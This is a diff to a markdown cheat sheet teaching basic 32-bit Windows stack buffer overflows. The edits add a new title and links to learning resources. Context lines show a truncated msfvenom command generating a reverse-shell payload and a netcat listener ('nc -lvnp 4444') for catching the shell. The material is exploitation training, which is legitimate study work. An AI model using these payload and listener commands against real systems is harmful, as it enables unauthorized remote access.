@@ -1,5 +1,8 @@
-# Legacyy's 32bit Stack Overflow Cheat Sheet
-These are my notes for 32bit stack overflow. It is based on windows but a lot is transferrable to linux too. :)
+# 32bit Shellcode Based Buffer Overflow
+These are my notes for a basic 32bit buffer overflow with shellcode. It is based on windows but a lot is transferrable to linux too. I am aware that this guide is by no means perfect, it is just my take on what a basic buffer overflow encompasses. I have linked some good writeups below that helped me on my way when learning this simple attack.
+
+[Nightmare][https://guyinatuxedo.github.io/index.html] is a great github repository, it is essentially a zero to hero guide in reverse engineering and binary exploitation.
+[DoStackBufferOverFlowGood][https://github.com/justinsteven/dostackbufferoverflowgood] is what inspried me to make this cheat sheet. Goes into much greater detail about the attack and how it works.
 
 This cheat sheet assumes that the binary doesn't have ASLR or NX enabled, meaning you can simply ret to a `jmp esp` instruction and execute shellcode from there.
 
@@ -205,6 +208,7 @@ msfvenom -p windows/shell_reverse_tcp -b '\x00\x0A' -f python --var-name shellco
 Once you have your exploit code written it is simple enough to get a remote shell back to you. I would highly recommend just trying to pop calc before hand, this is because catching a reverse shell is another level of things to go wrong with the exploit and it's much better to troubleshoot whether your shellcode is working or not by using a simple shellcode command beforehand to make sure it's being executed correctly in the first place...
 
 You can simply use netcat to listen for a reverse shell connection, or you can use metasploits multi handler, snippets for both are below. Once you have the listener set up using either method, simply run your exploit script and you *should* have a shell!
+
 **Using netcat**
 ```bash
 nc -lvnp 4444
